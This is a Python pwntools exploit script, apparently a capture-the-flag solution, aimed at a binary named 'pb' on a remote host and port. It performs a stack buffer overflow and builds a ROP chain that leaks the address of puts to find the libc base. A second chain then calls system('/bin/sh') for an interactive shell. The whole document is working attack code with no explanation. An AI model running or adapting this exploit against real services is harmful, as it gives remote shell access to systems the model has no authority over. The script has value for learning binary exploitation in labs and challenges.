from pwn import *

rem = True

libc = ELF('./glibc/libc.so.6')
elf = ELF('./pb')
rop = ROP(elf)
g_rdi_ret = rop.find_gadget(['pop rdi', 'ret']).address
g_ret = rop.find_gadget(['ret']).address 

plt_puts = elf.plt['puts']
got_puts = elf.got['puts']
box = elf.symbols['box']

if not rem:
    p = process('./pb')
else:
    p = remote('144.126.196.198', 32494)

p.sendline(b'2')

padding = b'A' * 40 + b'B' * 8 
exploit = p64(g_ret) + p64(g_rdi_ret) + p64(got_puts) + p64(plt_puts) + p64(box)
payload = padding + exploit
p.sendline(payload)
p.recvuntil(b'thank you!')
puts_leak = u64(p.recvuntil(b'This').replace(b'This', b'').strip().ljust(8, b'\x00'))
libc_base = puts_leak - libc.symbols['puts']
log.info(f'libc base {hex(libc_base)}')

libc_system = libc_base + libc.symbols['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh'))

log.info(f'system @ {hex(libc_system)}')
log.info(f'binsh @ {hex(bin_sh)}')
chain = p64(g_ret) + p64(g_rdi_ret) + p64(bin_sh) + p64(libc_system)
p.sendline(b'2')
# Extra padding required, analysis of gdb shows this
p.sendline(padding + b'C' * 8 + chain)

p.interactive()
